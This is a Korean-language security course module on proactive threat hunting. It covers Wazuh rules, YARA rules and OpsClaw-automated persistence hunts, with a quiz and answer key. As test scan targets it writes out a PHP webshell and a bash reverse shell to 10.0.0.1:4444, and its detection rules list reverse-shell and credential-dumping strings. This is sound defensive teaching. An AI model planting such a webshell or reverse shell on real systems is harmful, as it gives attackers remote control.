- `<time>00:00-06:00</time>`: 특정 시간대에만 룰을 적용한다

**결과 해석**: 커스텀 디코더와 룰을 통해 조직 특화 로그(OpsClaw, 웹 애플리케이션)를 파싱하고 위협을 탐지할 수 있다. 위협 헌팅 룰은 단순한 시그니처가 아니라 행동 패턴(비정상 시간 로그인, 임시 디렉토리 실행 등)에 기반하여 알려지지 않은 위협도 탐지한다.

**실전 활용**: Wazuh 룰은 SIGMA 룰에서 변환하여 사용할 수도 있다. 커스텀 디코더는 조직만의 애플리케이션 로그를 SIEM에 통합하는 핵심 기능이다. wazuh-logtest로 반드시 사전 테스트 후 배포한다.

**트러블슈팅**:
- 디코더 미매칭: `wazuh-logtest`로 로그 한 줄씩 테스트하여 prematch/regex 확인
- 룰 미발화: `if_sid`가 올바른지, 상위 룰이 먼저 매칭되는지 확인
- XML 문법 오류: `/var/ossec/bin/wazuh-logtest` 실행 시 오류 메시지 확인

---

# Part 4: YARA 룰과 프로액티브 헌팅 워크플로우 (40분)

## 4.1 YARA 룰의 개요

YARA는 패턴 매칭 기반의 악성코드 분류/탐지 도구이다. 문자열, 바이트 패턴, 조건을 조합하여 파일이나 메모리에서 악성코드를 식별한다.

### YARA 룰 구조

```
+--------------------------------------------------------------+
|                    YARA 룰 구조                               |
+--------------------------------------------------------------+
|                                                              |
|  rule rule_name {                                            |
|      meta:                                                   |
|          author = "작성자"                                    |
|          description = "설명"                                |
|          date = "2026-04-01"                                 |
|                                                              |
|      strings:                                                |
|          $s1 = "패턴1" ascii wide                           |
|          $s2 = { 4D 5A 90 00 }  // 바이트 패턴             |
|          $s3 = /regex[0-9]+/                                |
|                                                              |
|      condition:                                              |
|          2 of ($s*) and filesize < 1MB                       |
|  }                                                           |
|                                                              |
+--------------------------------------------------------------+
```

### 실습 5: YARA 룰 작성과 악성코드 탐지

**실습 목적**: YARA 룰을 작성하여 파일 시스템에서 웹셸, 백도어, 악성 스크립트를 탐지하고, 메모리 스캔에 활용한다.

**배우는 것**: YARA 룰 문법 (strings, condition), 악성코드 패턴 정의, 파일/디렉토리 스캔, 메모리 스캔

```bash
# -- opsclaw 서버에서 실행 --

# 1. YARA 설치
echo "[+] YARA 설치:"
echo "  sudo apt install yara"
echo "  # 또는 pip"
echo "  pip3 install yara-python"

# 2. YARA 룰 작성: 웹셸 탐지
echo ""
echo "[+] YARA 룰 1: PHP 웹셸 탐지"
cat << 'YARA1_EOF'
rule PHP_Webshell_Generic {
    meta:
        author = "OpsClaw Security Team"
        description = "일반적인 PHP 웹셸 패턴을 탐지한다"
        date = "2026-04-01"
        severity = "critical"
        reference = "https://attack.mitre.org/techniques/T1505/003/"
    
    strings:
        // 명령 실행 함수
        $exec1 = "system(" ascii nocase
        $exec2 = "exec(" ascii nocase
        $exec3 = "shell_exec(" ascii nocase
        $exec4 = "passthru(" ascii nocase
        $exec5 = "popen(" ascii nocase
        $exec6 = "proc_open(" ascii nocase
        
        // 코드 실행 함수
        $eval1 = "eval(" ascii nocase
        $eval2 = "assert(" ascii nocase
        $eval3 = "preg_replace" ascii nocase
        
        // Base64 디코딩 (난독화)
        $obf1 = "base64_decode(" ascii nocase
        $obf2 = "gzinflate(" ascii nocase
        $obf3 = "str_rot13(" ascii nocase
        
        // HTTP 파라미터 접근
        $input1 = "$_GET[" ascii
        $input2 = "$_POST[" ascii
        $input3 = "$_REQUEST[" ascii
        $input4 = "$_COOKIE[" ascii
    
    condition:
        // PHP 파일이면서
        (uint16(0) == 0x3F3C or  // <?
         uint32(0) == 0x68703F3C)  // <?ph
        and
        // 명령 실행 + 사용자 입력 조합
        (any of ($exec*) and any of ($input*))
        or
        // eval + 난독화 조합
        (any of ($eval*) and any of ($obf*))
}
YARA1_EOF

# 3. YARA 룰 작성: Linux 백도어 탐지
echo ""
echo "[+] YARA 룰 2: Linux 리버스 셸 백도어"
cat << 'YARA2_EOF'
rule Linux_Reverse_Shell {
    meta:
        author = "OpsClaw Security Team"
        description = "Linux 리버스 셸 스크립트를 탐지한다"
        date = "2026-04-01"
        severity = "critical"
    
    strings:
        // Bash 리버스 셸
        $bash1 = "/dev/tcp/" ascii
        $bash2 = "bash -i" ascii
        $bash3 = "0>&1" ascii
        
        // Python 리버스 셸
        $py1 = "socket.socket" ascii
        $py2 = "subprocess.call" ascii
        $py3 = "pty.spawn" ascii
        
        // Netcat 리버스 셸
        $nc1 = "nc -e /bin" ascii
        $nc2 = "ncat -e /bin" ascii
        $nc3 = "mkfifo" ascii
        
        // Perl 리버스 셸
        $perl1 = "IO::Socket::INET" ascii
        $perl2 = "exec(\"/bin/sh" ascii
    
    condition:
        2 of them
}
YARA2_EOF

# 4. YARA 룰 작성: 크리덴셜 수집 도구
echo ""
echo "[+] YARA 룰 3: 크리덴셜 수집 도구"
cat << 'YARA3_EOF'
rule Credential_Harvesting_Tool {
    meta:
        author = "OpsClaw Security Team"
        description = "크리덴셜 수집/덤프 도구를 탐지한다"
        date = "2026-04-01"
        severity = "high"
    
    strings:
        $tool1 = "mimikatz" ascii nocase
        $tool2 = "sekurlsa" ascii nocase
        $tool3 = "lsadump" ascii nocase
        $tool4 = "hashdump" ascii nocase
        $tool5 = "LaZagne" ascii nocase
        $tool6 = "pypykatz" ascii nocase
        $tool7 = "impacket" ascii nocase
        $tool8 = "GetUserSPNs" ascii nocase
        $tool9 = "secretsdump" ascii nocase
        
        // /etc/shadow 접근 패턴
        $linux1 = "/etc/shadow" ascii
        $linux2 = "unshadow" ascii
        $linux3 = "john --wordlist" ascii
    
    condition:
        any of them
}
YARA3_EOF

# 5. YARA 스캔 실행
echo ""
echo "[+] YARA 스캔 명령:"
echo ""
echo "  # 단일 파일 스캔"
echo "  yara webshell.yar /var/www/html/uploads/"
echo ""
echo "  # 디렉토리 재귀 스캔"
echo "  yara -r all_rules.yar /var/www/ /tmp/ /dev/shm/"
echo ""
echo "  # 프로세스 메모리 스캔"
echo "  yara -r all_rules.yar /proc/PID/mem"
echo ""
echo "  # 스캔 결과 JSON 출력"
echo "  yara -r -m all_rules.yar /var/www/ 2>/dev/null"

# 6. 테스트 파일로 스캔 시뮬레이션
echo ""
echo "[+] YARA 스캔 테스트:"
# 테스트용 의심 파일 생성
cat << 'TEST_PHP' > /tmp/test_webshell.php
<?php
$cmd = $_GET['cmd'];
echo shell_exec($cmd);
?>
TEST_PHP

cat << 'TEST_SH' > /tmp/test_backdoor.sh
#!/bin/bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
TEST_SH

echo "  테스트 파일 생성:"
echo "    /tmp/test_webshell.php"
echo "    /tmp/test_backdoor.sh"
echo ""
echo "  YARA 스캔 (실행 가능한 경우):"
echo "    yara -r /opt/yara-rules/*.yar /tmp/test_*.{php,sh}"

# 정리
rm -f /tmp/test_webshell.php /tmp/test_backdoor.sh
```

**명령어 해설**:
- `$s1 = "pattern" ascii nocase`: 대소문자를 무시하고 ASCII 문자열 패턴을 검색한다
- `$hex = { 4D 5A 90 00 }`: 바이트 시퀀스(PE 파일 헤더 등)를 16진수로 매칭한다
- `uint16(0) == 0x3F3C`: 파일의 첫 2바이트가 `<?`인지 확인한다 (PHP 파일 식별)
- `any of ($exec*)`: `$exec`로 시작하는 문자열 중 하나라도 매칭되면 참
- `2 of them`: 정의된 모든 문자열 중 2개 이상 매칭되면 참
- `yara -r rules.yar /path/`: 디렉토리를 재귀적으로 스캔한다

**결과 해석**: YARA 룰은 파일 내용의 패턴 조합으로 악성코드를 식별한다. 웹셸은 "명령 실행 함수 + 사용자 입력 접근"이라는 패턴 조합으로, 리버스 셸은 `/dev/tcp/`와 `bash -i` 조합으로 탐지한다. 단일 문자열이 아닌 여러 조건의 조합으로 오탐을 줄인다.

**실전 활용**: 침해 사고 대응 시 YARA로 전체 파일시스템을 스캔하면 웹셸, 백도어, 공격 도구를 빠르게 식별할 수 있다. Volatility3와 연동하면 메모리에서도 YARA 스캔이 가능하다. YARA 룰은 VirusTotal에서도 사용되며, 커뮤니티에서 공유된 룰을 활용할 수 있다.

**트러블슈팅**:
- YARA 설치: `sudo apt install yara` 또는 소스 빌드
- 스캔 속도: 대용량 디렉토리는 `-t` 옵션으로 쓰레드 수 지정
- 오탐: condition을 더 엄격하게 (예: `3 of them`으로 변경)

## 4.2 프로액티브 위협 헌팅 워크플로우

### 실습 6: OpsClaw를 활용한 위협 헌팅 캠페인

**실습 목적**: 가설 기반 위협 헌팅 캠페인을 계획하고, OpsClaw execute-plan으로 다중 서버에서 자동화된 헌팅을 수행한다.

**배우는 것**: 가설 기반 헌팅 방법론, OpsClaw 헌팅 자동화, 헌팅 결과 분석 및 보고

```bash
# -- opsclaw 서버에서 실행 --

# 1. 위협 헌팅 캠페인 계획
echo "[+] 위협 헌팅 캠페인: 지속성 메커니즘 탐지"
echo ""
echo "  가설: 공격자가 내부 서버에 지속성 메커니즘을 설치했을 수 있다"
echo ""
echo "  ATT&CK 기법:"
echo "    T1053.003 (Cron)"
echo "    T1543.002 (Systemd Service)"
echo "    T1098.004 (SSH Authorized Keys)"
echo "    T1546.004 (.bashrc/.profile 변조)"
echo ""
echo "  헌팅 대상: secu, web, siem 서버"

# 2. OpsClaw 헌팅 execute-plan
echo ""
echo "[+] OpsClaw 위협 헌팅 execute-plan:"
cat << 'HUNT_EOF'
curl -X POST http://localhost:8000/projects/{id}/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "echo \"=== CRONTAB HUNT ===\"; for user in $(cut -d: -f1 /etc/passwd); do echo \"--- $user ---\"; crontab -l -u $user 2>/dev/null; done; echo \"=== /etc/cron.d ===\"; ls -la /etc/cron.d/ 2>/dev/null; echo \"=== /etc/cron.daily ===\"; ls -la /etc/cron.daily/ 2>/dev/null",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.80:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "echo \"=== SYSTEMD HUNT ===\"; find /etc/systemd/system/ /lib/systemd/system/ -name '*.service' -newer /etc/hostname -ls 2>/dev/null; echo \"=== ENABLED SERVICES ===\"; systemctl list-unit-files --type=service --state=enabled | tail -20",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.80:8002"
      },
      {
        "order": 3,
        "instruction_prompt": "echo \"=== SSH KEY HUNT ===\"; find /home /root -name authorized_keys -exec echo FILE: {} \\; -exec cat {} \\; 2>/dev/null; echo \"=== RECENT SSH KEYS ===\"; find /home /root -name authorized_keys -newer /etc/hostname -ls 2>/dev/null",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.80:8002"
      },
      {
        "order": 4,
        "instruction_prompt": "echo \"=== BASHRC HUNT ===\"; for f in /home/*/.bashrc /home/*/.profile /root/.bashrc /root/.profile; do [ -f \"$f\" ] && echo \"--- $f ---\" && grep -n \"curl\\|wget\\|nc \\|ncat\\|python\\|/dev/tcp\" \"$f\" 2>/dev/null; done",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.80:8002"
      },
      {
        "order": 5,
        "instruction_prompt": "echo \"=== TMP BINARY HUNT ===\"; find /tmp /dev/shm /var/tmp -type f -executable -ls 2>/dev/null; echo \"=== HIDDEN FILES ===\"; find /tmp /var/tmp -name '.*' -type f -ls 2>/dev/null",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.80:8002"
      }
    ]
  }'
HUNT_EOF

# 3. secu 서버 헌팅
echo ""
echo "[+] secu 서버도 동일 헌팅 (subagent_url만 변경):"
echo "  subagent_url: http://10.20.30.1:8002"

# 4. 헌팅 결과 분석
echo ""
echo "[+] 헌팅 결과 분석 프레임워크:"
echo "  1. 수집 데이터 검토"
echo "     - 비정상 크론탭 항목?"
echo "     - 최근 생성된 systemd 서비스?"
echo "     - 미인가 SSH 키?"
echo "     - .bashrc에 악성 코드?"
echo "     - /tmp에 실행 가능한 숨겨진 파일?"
echo ""
echo "  2. 이상 항목 심층 분석"
echo "     - 파일 해시 → VirusTotal 조회"
echo "     - 파일 생성 시간 → 타임라인 매핑"
echo "     - 관련 프로세스 → 네트워크 연결 확인"
echo ""
echo "  3. 결과 기록"
echo "     - 발견사항 (Findings)"
echo "     - 권고사항 (Recommendations)"
echo "     - 사용 도구 및 명령"

# 5. 프로액티브 헌팅 일정
echo ""
echo "[+] 프로액티브 헌팅 일정 권장:"
echo "  +--------------+----------------------------------------+"
echo "  | 주기         | 헌팅 주제                              |"
echo "  +--------------┼----------------------------------------+"
echo "  | 매일         | 베이스라인 이탈 자동 탐지               |"
echo "  | 매주         | 지속성 메커니즘 점검                    |"
echo "  | 격주         | 네트워크 이상 트래픽 분석               |"
echo "  | 매월         | ATT&CK 기반 종합 헌팅 캠페인           |"
echo "  | 분기         | Navigator 커버리지 갱신 + 갭 분석       |"
echo "  +--------------+----------------------------------------+"
```

**명령어 해설**:
- `find -newer /etc/hostname`: 호스트네임 파일보다 새로운 파일을 검색한다 (시스템 설치 이후 변경된 파일)
- `grep -n "curl|wget|nc"`: .bashrc에서 잠재적 악성 명령을 검색한다 (행 번호 포함)
- execute-plan의 5개 task가 순차적으로 지속성 메커니즘(cron, systemd, SSH 키, bashrc, /tmp 바이너리)을 점검한다

**결과 해석**: 가설 기반 헌팅은 "공격자가 X를 했다면 어떤 흔적이 남았을까?"라는 질문에 답한다. 각 서버에서 지속성 메커니즘을 점검하여 크론탭, systemd, SSH 키, .bashrc에 비정상 항목이 있는지 확인한다. 발견된 항목은 타임라인 분석으로 공격 시점을 특정하고, 해시 비교로 악성 여부를 판단한다.

**실전 활용**: 위협 헌팅은 SOC의 성숙도를 높이는 핵심 활동이다. 반응형(알림 기반)에서 프로액티브(헌팅 기반)로 전환하면 탐지 누락을 줄이고, 공격자의 체류 시간(dwell time)을 단축할 수 있다. OpsClaw를 활용하면 수십 대의 서버를 동시에 헌팅할 수 있다.

**트러블슈팅**:
- 헌팅 결과 과다: 알려진 정상 항목을 제외(화이트리스트)하고 비정상만 분석
- 권한 부족: SubAgent가 root로 실행되어야 일부 파일 접근 가능
- 네트워크 오류: SubAgent 연결 상태 사전 점검

---

## 검증 체크리스트

실습 완료 후 다음 항목을 스스로 확인한다:

- [ ] SIGMA 룰의 기본 구조(title, logsource, detection, condition)를 설명할 수 있는가?
- [ ] SIGMA의 필드 수정자(|contains, |endswith, |re)를 사용할 수 있는가?
- [ ] sigma-cli로 SIGMA 룰을 다른 SIEM 포맷으로 변환할 수 있는가?
- [ ] ATT&CK Navigator로 탐지 커버리지 레이어를 생성할 수 있는가?
- [ ] 베이스라인 이탈 탐지의 원리(정상 → 비교 → 이탈 식별)를 설명할 수 있는가?
- [ ] Wazuh 커스텀 디코더(prematch, regex, order)를 작성할 수 있는가?
- [ ] Wazuh 커스텀 룰(if_sid, match, field)을 작성할 수 있는가?
- [ ] YARA 룰의 strings와 condition 섹션을 작성할 수 있는가?
- [ ] YARA로 파일시스템을 스캔하여 악성코드를 탐지할 수 있는가?
- [ ] 가설 기반 위협 헌팅의 방법론을 설명할 수 있는가?
- [ ] OpsClaw execute-plan으로 다중 서버 헌팅을 자동화할 수 있는가?

---

## 자가 점검 퀴즈 (10문항)

**Q1.** SIGMA 룰의 가장 큰 장점은?
- (a) 빠른 속도  (b) **SIEM 벤더 중립적 (하나의 룰로 여러 SIEM 변환)**  (c) GUI 지원  (d) 무료

**Q2.** SIGMA 룰에서 로그 소스를 지정하는 키워드는?
- (a) source  (b) input  (c) **logsource**  (d) log_type

**Q3.** ATT&CK Navigator의 주요 용도는?
- (a) 공격 실행  (b) **탐지 커버리지 시각화 및 갭 분석**  (c) 로그 수집  (d) 네트워크 모니터링

**Q4.** 베이스라인 이탈 탐지의 장점은?
- (a) 빠른 속도  (b) 오탐 없음  (c) **알려지지 않은 위협도 탐지 가능**  (d) 설정 불필요

**Q5.** Wazuh 디코더에서 로그의 첫 부분을 매칭하는 태그는?
- (a) match  (b) regex  (c) **prematch**  (d) filter

**Q6.** YARA 룰에서 여러 문자열 중 하나라도 매칭되면 참인 조건은?
- (a) all of them  (b) **any of them**  (c) 1 of them  (d) none of them

**Q7.** 위협 헌팅의 "가설 기반" 접근이란?
- (a) 무작위 검색  (b) **특정 위협 시나리오를 가정하고 검증**  (c) 알림 기반 대응  (d) 자동화 스캔

**Q8.** YARA에서 `uint16(0) == 0x3F3C`의 의미는?
- (a) 파일 크기 확인  (b) **파일의 첫 2바이트가 `<?`인지 확인**  (c) 해시 비교  (d) 권한 확인

**Q9.** SIGMA 룰에서 `condition: selection | count(source_ip) by source_ip > 5`의 의미는?
- (a) 5개 파일 검색  (b) **동일 IP에서 5회 초과 발생 시 탐지**  (c) 5초 타임아웃  (d) 5개 룰 조합

**Q10.** 프로액티브 위협 헌팅의 반대 개념은?
- (a) 자동화  (b) 수동 분석  (c) **반응형(알림 기반) 탐지**  (d) 포렌식

**정답:** Q1:b, Q2:c, Q3:b, Q4:c, Q5:c, Q6:b, Q7:b, Q8:b, Q9:b, Q10:c

---

## 과제

### 과제 1: SIGMA 룰셋 작성 (필수)
Week 01-07에서 다룬 공격 기법에 대해:
- SIGMA 룰 5개 이상 작성 (각각 다른 ATT&CK 기법 매핑)
- sigma-cli로 Elasticsearch 또는 Wazuh 포맷으로 변환
- 각 룰의 falsepositives와 level 선정 근거를 설명하라

### 과제 2: 위협 헌팅 캠페인 보고서 (필수)
가설 기반 위협 헌팅 캠페인을 수행하고:
- 헌팅 가설 3가지 이상 수립 (ATT&CK 매핑)
- OpsClaw execute-plan JSON 페이로드 작성
- 헌팅 결과(발견사항/권고사항) 보고서 작성

### 과제 3: YARA 룰셋 + ATT&CK 커버리지 갱신 (선택)
YARA 룰을 작성하고 ATT&CK Navigator 레이어를 갱신하라:
- YARA 룰 3개 이상 작성 (웹셸, 백도어, 크리덴셜 도구)
- 현재 탐지 커버리지를 Navigator 레이어로 시각화
- 갭 분석 결과와 개선 로드맵을 제시하라

---

## 다음 주 예고

**Week 09: 종합 공방전 시뮬레이션 I — 팀 기반 공격·방어 훈련**
- 레드팀/블루팀으로 나눠 실전 공방전 수행
- Week 01-08에서 배운 모든 기법을 종합 활용
- OpsClaw를 통한 자동화된 공격·방어 워크플로우
